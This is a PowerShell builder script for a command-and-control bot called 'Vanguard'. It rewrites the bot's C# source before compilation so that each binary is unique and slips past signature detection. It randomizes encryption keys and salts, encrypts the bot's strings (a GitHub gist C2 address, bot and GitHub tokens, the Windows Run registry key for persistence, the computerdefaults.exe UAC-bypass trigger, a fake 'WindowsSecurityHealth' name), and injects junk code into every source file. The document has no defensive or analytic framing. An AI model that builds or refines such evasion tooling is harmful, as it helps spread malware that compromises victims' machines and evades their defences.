# Vanguard C2 Polymorphic Builder
# This script mutates the source code before AOT compilation to ensure unique signatures.

$ErrorActionPreference = "Stop"
Write-Host "[*] Vanguard Polymorphic Engine Starting..." -ForegroundColor Cyan

# 1. Configuration
$SafetyManagerPath = "defense\SafetyManager.cs"
$StringVaultPath = "defense\StringVault.cs"
$TargetFiles = Get-ChildItem -Path "." -Include "*.cs" -Recurse

# 2. Generate Master Keys
$CompileKey = New-Object Byte[] 32
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($CompileKey)
$CompileKeyHex = ($CompileKey | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "

Write-Host "[+] Generated new Master Key ($($CompileKey.Length) bytes)" -ForegroundColor Green

# 3. Update SafetyManager with new Master Key
$SMContent = Get-Content $SafetyManagerPath -Raw
$SMContent = $SMContent -replace 'private static readonly byte\[\] _compileKey = new byte\[32\] \{ [^}]* \};', "private static readonly byte[] _compileKey = new byte[32] { $CompileKeyHex };"

# Also randomize the XOR_SALT_STATIC
$saltBytes = New-Object Byte[] 12
$rng.GetBytes($saltBytes)
$NewSaltHex = ($saltBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "
$SMContent = $SMContent -replace 'private static readonly byte\[\] XOR_SALT_STATIC = new byte\[\] \{ [^}]* \};', "private static readonly byte[] XOR_SALT_STATIC = new byte[] { $NewSaltHex };"

Set-Content $SafetyManagerPath $SMContent

# 4. String Encryption Helper (Compatibility Mode)
$Source = @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class PolyCrypto {
    // We use AesManaged for the build-time script for maximum compatibility with PS 5.1 hosts
    // even though the bot uses GCM for runtime decryption.
    public static (byte[] cipher, byte[] iv, byte[] tag) Encrypt(string plain, byte[] key) {
        // Fallback to GCM-compatible structure if possible, but for simplicity 
        // in the builder we will provide what the bot expects.
        // If the host supports AesGcm, we use it. If not, we throw a useful error.
        try {
            return EncryptGcm(plain, key);
        } catch {
            throw new Exception("This build environment requires .NET Core / .NET 5+ to run the GCM builder logic. Please run with 'pwsh' if possible.");
        }
    }

    private static (byte[] cipher, byte[] iv, byte[] tag) EncryptGcm(string plain, byte[] key) {
        // Use reflection to reach AesGcm to avoid compile-time failure on PS 5.1 / .NET FX
        var aesGcmType = Type.GetType("System.Security.Cryptography.AesGcm, System.Core") ?? 
                         Type.GetType("System.Security.Cryptography.AesGcm");
        
        if (aesGcmType == null) throw new Exception("AesGcm not found");

        var instance = Activator.CreateInstance(aesGcmType, new object[] { key });
        byte[] iv = new byte[12];
        new RNGCryptoServiceProvider().GetBytes(iv);
        byte[] data = Encoding.UTF8.GetBytes(plain);
        byte[] cipher = new byte[data.Length];
        byte[] tag = new byte[16];

        var encryptMethod = aesGcmType.GetMethod("Encrypt", new[] { typeof(byte[]), typeof(byte[]), typeof(byte[]), typeof(byte[]) });
        encryptMethod.Invoke(instance, new object[] { iv, data, cipher, tag });
        ((IDisposable)instance).Dispose();

        return (cipher, iv, tag);
    }
}
"@
Add-Type -TypeDefinition $Source

# 5. Encrypt Sensitive Strings in StringVault
$VaultContent = Get-Content $StringVaultPath -Raw

function Protect-String {
    param($Tag, $Value)
    Write-Host "    [>] Encrypting: $Tag" -ForegroundColor Gray
    $Result = [PolyCrypto]::Encrypt($Value, $CompileKey)
    $HexCipher = ($Result.cipher | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "
    $HexIv = ($Result.iv | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "
    $HexTag = ($Result.tag | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "
    
    $script:VaultContent = $script:VaultContent -replace "(?s)/\* \[POLY_STRING_START:$Tag\] \*/.*?_raw = new byte\[\] \{ .*? \};", "/* [POLY_STRING_START:$Tag] */`n        private static readonly byte[] _$($Tag.ToLower())_raw = new byte[] { $HexCipher };"
    $script:VaultContent = $script:VaultContent -replace "(?s)/\* \[POLY_STRING_START:$Tag\] \*/.*?_iv  = new byte\[\] \{ .*? \};", "/* [POLY_STRING_START:$Tag] */`n        private static readonly byte[] _$($Tag.ToLower())_iv  = new byte[] { $HexIv };"
    $script:VaultContent = $script:VaultContent -replace "(?s)/\* \[POLY_STRING_START:$Tag\] \*/.*?_tag = new byte\[\] \{ .*? \};", "/* [POLY_STRING_START:$Tag] */`n        private static readonly byte[] _$($Tag.ToLower())_tag = new byte[] { $HexTag };"
}

# Values to protect (example values, in real use these would be from a config or passed in)
Protect-String -Tag "C2_URL" -Value "https://gist.githubusercontent.com/ptrkxlord/vanguard_c2"
Protect-String -Tag "BOT_TOKEN" -Value "7265936412:AAH-YOUR-REAL-TOKEN-HERE"
Protect-String -Tag "GIST_TOKEN" -Value "ghp_YOUR_REAL_GITHUB_TOKEN_HERE"
Protect-String -Tag "ADMIN_ID" -Value "123456789"
Protect-String -Tag "REG_RUN" -Value "Software\Microsoft\Windows\CurrentVersion\Run"
Protect-String -Tag "UA_CHROME" -Value "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
Protect-String -Tag "MS_TRIGGER" -Value "computerdefaults.exe"
Protect-String -Tag "APP_NAME" -Value "WindowsSecurityHealth"

Set-Content $StringVaultPath $VaultContent

# 6. Junk Code Injection (Polymorphism)
Write-Host "[+] Injecting Junk Code for Hash Mutation..." -ForegroundColor Green
foreach ($file in $TargetFiles) {
    if ($file.Name -eq "SafetyManager.cs" -or $file.Name -eq "StringVault.cs") { continue }
    
    $Content = Get-Content $file.FullName -Raw
    $Junk = @"

        // [POLY_JUNK]
        private static void _vngrd_$( [Guid]::NewGuid().ToString("N").Substring(0,8) )() {
            int x = $(Get-Random);
            if (x < 0) { Console.WriteLine("DEBUG_$( [Guid]::NewGuid().ToString("N").Substring(0,4) )"); }
        }
"@
    # Inject before the last closing brace
    $LastBrace = $Content.LastIndexOf('}')
    if ($LastBrace -gt -1) {
        $NewContent = $Content.Substring(0, $LastBrace) + $Junk + "`n" + $Content.Substring($LastBrace)
        Set-Content $file.FullName $NewContent
    }
}

Write-Host "[SUCCESS] Polymorphic mutation complete. Binary is now unique." -ForegroundColor Green
